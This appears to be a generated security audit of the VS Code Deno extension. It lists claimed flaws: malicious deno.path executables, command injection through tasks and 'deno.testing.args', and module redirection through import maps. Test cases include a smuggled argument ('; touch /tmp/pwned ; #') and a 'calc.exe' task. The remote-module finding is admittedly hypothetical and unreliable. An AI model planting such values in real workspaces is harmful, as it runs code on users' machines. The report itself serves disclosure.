## Combined Vulnerability List

### Arbitrary Code Execution via Malicious Deno Path Configuration

- **Vulnerability Name:** Arbitrary Code Execution via Malicious Deno Path Configuration
- **Description:**
    1. An attacker can trick a user into configuring the `deno.path` setting in VS Code to point to a malicious executable instead of the legitimate Deno CLI. This can be achieved through social engineering, phishing, or by compromising a user's settings synchronization, or by crafting a malicious Visual Studio Code workspace with a `.vscode/settings.json` file.
    2. The user, unaware of the malicious configuration, continues to use the VS Code Deno extension as usual or opens the malicious workspace.
    3. When the extension initializes or needs to execute a Deno command for various features like formatting, linting, testing, debugging, caching, or starting the language server, it retrieves the executable path from the `deno.path` setting.
    4. Instead of executing the legitimate Deno CLI, the extension inadvertently executes the malicious executable specified in `deno.path`.
    5. The malicious executable then runs with the privileges of the VS Code process, allowing the attacker to execute arbitrary code on the user's machine.
- **Impact:**
    - Critical. Successful exploitation of this vulnerability allows for arbitrary code execution on the user's machine.
    - This can lead to a wide range of malicious activities, including:
        - Full compromise of the user's system and sensitive information.
        - Data theft and exfiltration, including personal files, credentials, and project-related data.
        - Installation of malware, including ransomware, spyware, or viruses.
        - Unauthorized access to local network resources and other systems accessible from the victim's machine.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The extension currently lacks any input validation or sanitization for the `deno.path` configuration. It directly uses the path provided by the user without verification. The extension relies on the user having a correctly configured and trusted environment and assumes users will not open workspaces from untrusted sources or modify settings to point to malicious executables.
- **Missing Mitigations:**
    - Input validation and sanitization for the `deno.path` configuration setting. While reliably validating if a given executable is the legitimate Deno CLI is challenging, some basic checks could be implemented:
        - Check if the executable path is within a standard installation directory.
        - Attempt to execute the executable with a `--version` flag and verify if the output resembles a valid Deno version string.
    - Enhanced documentation and user warnings:
        - Clearly document the security risks associated with modifying the `deno.path` setting.
        - Warn users against setting `deno.path` to executables from untrusted sources or locations.
        - Consider displaying a warning message within VS Code when the `deno.path` setting is modified, advising users to exercise caution.
    - Explore alternative approaches to execute Deno CLI:
        - Investigate if there are secure methods to bundle or manage the Deno CLI within the extension itself, reducing reliance on user-provided paths.
    - Implement a mechanism to verify the integrity of the Deno CLI executable before execution, potentially using checksums or signatures.
    - Leverage VS Code's Workspace Trust API more explicitly to prompt users to trust workspaces before applying workspace settings, especially those that can lead to code execution.
- **Preconditions:**
    - The VS Code Deno extension must be installed and active.
    - The user must be tricked into modifying the `deno.path` setting in VS Code to point to a malicious executable, or open a malicious workspace that sets this setting.
    - Workspace Trust in VS Code is either not enabled, or the user has explicitly trusted the malicious workspace, or bypassed the trust prompt.
- **Source Code Analysis:**
    - File: `client/src/util.ts`
        - Function: `getDenoCommandPath()`
            ```typescript
            export async function getDenoCommandPath() {
              const command = getWorkspaceConfigDenoExePath(); // Retrieves deno.path from configuration
              const workspaceFolders = workspace.workspaceFolders;
              if (!command || !workspaceFolders) {
                return command ?? await getDefaultDenoCommand();
              } else if (!path.isAbsolute(command)) {
                // if sent a relative path, iterate over workspace folders to try and resolve.
                for (const workspace of workspaceFolders) {
                  const commandPath = path.resolve(workspace.uri.fsPath, command);
                  if (await fileExists(commandPath)) { // Checks if file exists, but not if it's legitimate
                    return commandPath;
                  }
                }
                return undefined;
              } else {
                return command; // Returns user-provided path without validation
              }
            }
            ```
        - The code retrieves the `deno.path` setting using `getWorkspaceConfigDenoExePath()`.
        - It attempts to resolve relative paths and checks for file existence using `fileExists()`.
        - **Vulnerability:** The function returns the user-provided path without any validation to ensure it is a legitimate Deno executable. It only checks if a file exists at the given path.
    - File: `client/src/commands.ts` - `startLanguageServer` function:
        ```typescript
        export function startLanguageServer(
          context: vscode.ExtensionContext,
          extensionContext: DenoExtensionContext,
        ): Callback {
          return async () => {
            // ...
            const command = await getDenoCommandPath();
            if (command == null) {
              // ... error handling ...
              return;
            }

            const serverOptions: ServerOptions = {
              run: {
                command, // <--- Malicious path from deno.path is used directly here
                args: ["lsp"],
                options: { env },
              },
              debug: {
                command, // <--- Malicious path from deno.path is used directly here
                // ...
                args: ["lsp"],
                options: { env },
              },
            };
            const client = new LanguageClient(
              // ...
              serverOptions,
              // ...
            );
            // ... client start ...
          };
        }
        ```
        The `startLanguageServer` function calls `getDenoCommandPath` to get the Deno command. The returned `command` is then directly used in the `serverOptions` for both `run` and `debug` configurations of the Language Client, which then uses this command to spawn the Deno language server process. There is no validation or sanitization of the `command` variable before it's used to spawn the process.

    - Visualization:
        ```
        User Settings (VS Code) / Workspace Settings (.vscode/settings.json)

        System Command Execution (Arbitrary Code Execution if malicious path)
        ```
- **Security Test Case:**
    1. **Prepare Malicious Executable:**
        - Create a file named `malicious-deno.sh` (or `malicious-deno.bat` on Windows) with malicious code, for example to create a directory and simulate Deno behavior.
        - Make the script executable: `chmod +x malicious-deno.sh`.
    2. **Configure `deno.path` in VS Code:**
        - Open VS Code settings and set `Deno › Path` setting to the absolute path of the malicious script. Or create a malicious workspace with `.vscode/settings.json` setting `deno.path`.
    3. **Trigger Extension Functionality:**
        - Open any TypeScript or JavaScript file in VS Code.
        - Ensure Deno is enabled for the workspace.
        - Trigger a Deno command like formatting, linting, testing, or enabling the language server by restarting or reloading VS Code.
    4. **Verify Exploitation:**
        - Check if the malicious code was executed, for example by verifying if a directory `/tmp/vscode-deno-exploit` was created or by observing output in the VS Code Output panel for "Malicious Deno Executable is running!".
    5. **Expected Result:**
        - The malicious executable should be successfully executed by the VS Code Deno extension when a Deno command is triggered, demonstrating arbitrary code execution.

### Command Injection in Task Execution

- **Vulnerability Name:** Command Injection in Task Execution
- **Description:**
    1. An attacker crafts a malicious Deno project.
    2. Within this project, the attacker creates a `deno.json` or `deno.jsonc` configuration file with a malicious task definition. This definition contains a command with command injection techniques.
    3. A user opens this malicious Deno project in Visual Studio Code with the Deno extension active.
    4. The Deno extension parses the `deno.json` or `deno.jsonc` file, reading and registering the malicious task.
    5. The user, interacting with the Deno Tasks sidebar, selects and executes the malicious task.
    6. The Deno extension directly passes the command string from the task definition to the system's shell without proper sanitization or validation, leading to arbitrary code execution on the user's machine.
- **Impact:**
    - Critical. Successful exploitation of this vulnerability allows for arbitrary code execution on the user's machine.
    - This can lead to:
        - Data theft.
        - Malware installation.
        - System compromise.
        - Privilege escalation.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. Task commands and arguments are passed directly to `vscode.ProcessExecution` without sanitization or validation.
- **Missing Mitigations:**
    - Input Sanitization and Validation: Implement robust sanitization and validation of task commands and arguments.
    - Parameterized Commands: Use parameterized commands instead of directly executing shell commands.
    - Secure Task Execution Environment: Run tasks in a sandboxed or isolated environment.
    - User Confirmation and Review: Prompt users for confirmation before executing tasks from workspace configurations.
    - Principle of Least Privilege: Ensure tasks operate with minimum necessary privileges.
- **Preconditions:**
    - The user must have the Deno extension for Visual Studio Code installed and enabled.
    - The user must open a workspace with a maliciously crafted `deno.json` or `deno.jsonc` file.
    - The user must interact with the Deno Tasks sidebar and execute the malicious task.
- **Source Code Analysis:**
    - File: `client\src\tasks_sidebar.ts`
        - The `#runTask(task: DenoTask)` method directly calls `tasks.executeTask(task.task);` to execute the task initiated from the sidebar.
    - File: `client\src\tasks.ts`
        - The `buildDenoTask` function constructs a `vscode.Task` object using `vscode.ProcessExecution`.
        - The `command` and `args` parameters of `DenoTaskDefinition` are directly passed to the `ProcessExecution` constructor without sanitization.
- **Security Test Case:**
    1. Create a new directory `malicious-deno-project`.
    2. Create a `deno.jsonc` file with a malicious task like:
        ```jsonc
        {
          "tasks": {
            "maliciousTask": "echo 'Vulnerable' && calc.exe"
          }
        }
        ```
    3. Open the `malicious-deno-project` directory in VS Code.
    4. Open the "Deno Tasks" sidebar.
    5. Run the "maliciousTask".
    6. Observe the Calculator application launching, demonstrating arbitrary code execution.

### Remote Code Execution via Malicious Module

- **Vulnerability Name:** Remote Code Execution via Malicious Deno Project
- **Description:**
    1. An attacker crafts a malicious Deno project with a remote import statement pointing to a malicious remote module.
    2. A user opens this malicious project in Visual Studio Code with the `vscode_deno` extension enabled.
    3. The `vscode_deno` extension triggers the Deno Language Server to analyze the project and fetch remote modules.
    4. Due to a vulnerability in the Deno Language Server's module fetching, caching, or processing of the malicious remote module, arbitrary code execution occurs on the user's machine.
- **Impact:** Arbitrary code execution on the user's machine, leading to full system control, data theft, and malware installation.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None in the `vscode_deno` extension directly, as the vulnerability is described to be within the Deno Language Server.
- **Missing Mitigations:**
    - Input validation and sanitization of remote module URLs and content within the Deno Language Server.
    - Sandboxing or isolation of the module fetching and caching process.
    - Security review and hardening of the Deno Language Server's module handling logic.
    - Implementation of Content Security Policy (CSP) or similar mechanisms within the Deno Language Server.
- **Preconditions:**
    1. The user must have the `vscode_deno` extension installed and enabled.
    2. The user must open a malicious Deno project in Visual Studio Code.
    3. The malicious project must include a remote import that exploits a vulnerability in the Deno Language Server.
- **Source Code Analysis:**
    - The `vscode_deno` extension acts as a client to the Deno Language Server. The vulnerability is likely within the Deno Language Server (deno lsp) in how it handles remote modules.
    - Potential vulnerability locations in Deno LSP: Remote Module Fetching, Module Caching, Module Processing/Execution.
- **Security Test Case:**
    1. **Setup Malicious Server:** Create an HTTP server to serve a malicious Deno module.
    2. **Create Malicious Module:** Create a `malicious_module.ts` file with code designed to trigger a hypothetical RCE vulnerability.
    3. **Create Malicious Deno Project:** Create a `main.ts` file in a new project directory with a remote import pointing to the malicious module on the server.
    4. **Open Project in VS Code:** Open the malicious project in VS Code with the `vscode_deno` extension enabled.
    5. **Observe for Exploitation:** Monitor for indicators of code execution, check logs, and network traffic.

### Command Injection via `deno.testing.args`

- **Vulnerability Name:** Command Injection via `deno.testing.args`
- **Description:**
    1. The VS Code Deno extension allows users to configure test arguments via the `deno.testing.args` setting.
    2. The extension directly passes these arguments to the `deno test` command without sanitization.
    3. An attacker can manipulate `deno.testing.args` in workspace settings to inject arbitrary commands.
    4. When the extension runs tests, the injected commands are executed by the system.
- **Impact:**
    - Critical. Successful exploitation allows arbitrary command execution on the user's machine.
    - This can lead to data exfiltration, malware installation, and system compromise.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The extension directly passes user-provided arguments without sanitization.
- **Missing Mitigations:**
    - Input Sanitization: Sanitize or validate arguments in `deno.testing.args`.
    - Argument Validation: Implement strict validation rules for test arguments.
    - Principle of Least Privilege: Enforce more restrictive permissions for test execution.
    - Security Warnings: Display warnings about risks of modifying workspace settings controlling command arguments.
- **Preconditions:**
    1. The attacker needs to modify workspace settings (malicious repository, social engineering).
    2. The user must have the Deno extension enabled.
    3. The user must trigger test execution via Test Explorer or Code Lens.
- **Source Code Analysis:**
    - File: `client/src/commands.ts`, function `test`: Retrieves `deno.testing.args` from workspace configuration and directly includes them in the `deno test` command arguments.
    - File: `client/src/tasks.ts`, function `buildDenoTask`: Uses `vscode.ProcessExecution` to execute the command with unsanitized user-controlled arguments.
- **Security Test Case:**
    1. **Prerequisites:** VS Code with Deno extension, workspace with `.vscode` directory and test file.
    2. **Steps:**
        a. Open workspace settings and edit `.vscode/settings.json`.
        b. Add configuration:
           ```json
           {
               "deno.enable": true,
               "deno.testing.args": [ "; touch /tmp/pwned ; #" ]
           }
           ```
        c. Save `settings.json`.
        d. Open testing panel and run tests.
    3. **Expected Result:** Check for the existence of `/tmp/pwned` file, confirming command injection.

### Malicious Module Redirection via Import Map

- **Vulnerability Name:** Malicious Module Redirection via `deno.json` and `import_map.json`
- **Description:**
    1. An attacker crafts a malicious project with `deno.json` or `import_map.json` files.
    2. These files redirect module imports to attacker-controlled scripts.
    3. A user opens this project in VS Code with the "Deno for Visual Studio Code" extension enabled.
    4. The extension applies configurations, and the Deno language server resolves dependencies using malicious redirects.
    5. This results in arbitrary code execution within the user's workspace when the Deno language server fetches and processes these malicious scripts.
- **Impact:** Arbitrary code execution within the user's workspace, leading to data theft, file modification, and malware installation.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None identified in the extension that specifically mitigate malicious module redirection via configuration files.
- **Missing Mitigations:**
    - Input validation and sanitization for `deno.json` and `import_map.json` files, checking for malicious redirects.
    - Security warnings to the user when suspicious configurations are detected.
    - Sandboxing or isolation of module resolution and execution.
    - Improved documentation and user awareness about risks of untrusted projects.
- **Preconditions:**
    - User has the "Deno for Visual Studio Code" extension installed and enabled.
    - User opens a project from an attacker with malicious `deno.json` or `import_map.json`.
    - The Deno extension becomes active and resolves modules, triggering redirects.
- **Source Code Analysis:**
    - `client/src/extension.ts`: `initializationOptions` passes `deno.config` and `deno.importMap` settings to the language server without validation.
    - `client/src/commands.ts`: `startLanguageServer` initializes the Deno language server, which processes these configurations.
    - No code in the provided files validates or sanitizes `deno.json` or `import_map.json`.
- **Security Test Case:**
    1. Create a `malicious-deno-project` directory.
    2. Create `import_map.json` with a malicious redirect, e.g.:
       ```json
       {
         "imports": {
           "malicious_module/": "https://raw.githubusercontent.com/username/malicious-repo/main/"
         }
       }
       ```
    3. Create `main.ts` importing from `malicious_module/`.
    4. Create a public GitHub `malicious-repo` with `malicious_script.ts` containing malicious code (e.g., file creation).
    5. Open `malicious-deno-project` in VS Code, ensure Deno extension is enabled, and open `main.ts`.
    6. Check for the execution of malicious code (e.g., file `pwned.txt` creation).
